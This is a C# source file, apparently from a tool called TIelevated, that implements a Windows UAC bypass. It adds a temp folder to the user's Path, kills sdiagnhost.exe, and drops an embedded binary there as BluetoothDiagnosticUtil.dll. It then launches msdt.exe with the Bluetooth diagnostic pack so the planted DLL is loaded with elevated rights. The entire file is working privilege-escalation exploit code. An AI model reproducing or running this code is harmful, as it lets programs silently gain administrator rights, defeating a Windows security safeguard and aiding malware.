using System.Diagnostics;

namespace TIelevated.Common
{
    internal class UACBypass
    {
        private static readonly string CurrentPathVariable = Environment.GetEnvironmentVariable("Path", EnvironmentVariableTarget.User)!;
        
        public static void Prepare(string appPath)
        {
            if (string.IsNullOrEmpty(appPath))
            {
                throw new InvalidOperationException("Current executable path is null.");
            }

            if (string.IsNullOrEmpty(CurrentPathVariable))
            {
                throw new InvalidOperationException("Failed to get variable 'Path': Value is null.");
            }

            var targetPath = Path.Combine(Path.GetTempPath(), "TIelevated");
            Directory.CreateDirectory(targetPath);

            Environment.SetEnvironmentVariable("Path", CurrentPathVariable + ";" + targetPath, EnvironmentVariableTarget.User);

            var processes = Process.GetProcessesByName("sdiagnhost");
            foreach (var process in processes)
            {
                try
                {
                    process.Kill();
                }
                catch (Exception ex)
                {
                    Output.WriteLine($"Failed to kill sdiagnhost.exe: {ex.Message}", Output.Style.Warning);
                }
            }
            
            Thread.Sleep(2000);
            var uacHelperBin = UAC.UACRunner;
            File.WriteAllBytes(Path.Combine(targetPath, "BluetoothDiagnosticUtil.dll"), uacHelperBin);
            File.WriteAllText(Path.Combine(targetPath, "mylocation.txt"), appPath);
        }

        public static void RunPayload()
        {
            var process = new Process();
            process.StartInfo.FileName = @"C:\windows\syswow64\msdt.exe";
            process.StartInfo.Arguments = "-path C:\\WINDOWS\\diagnostics\\index\\BluetoothDiagnostic.xml -skip yes";
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.Start();
        }
    }
}
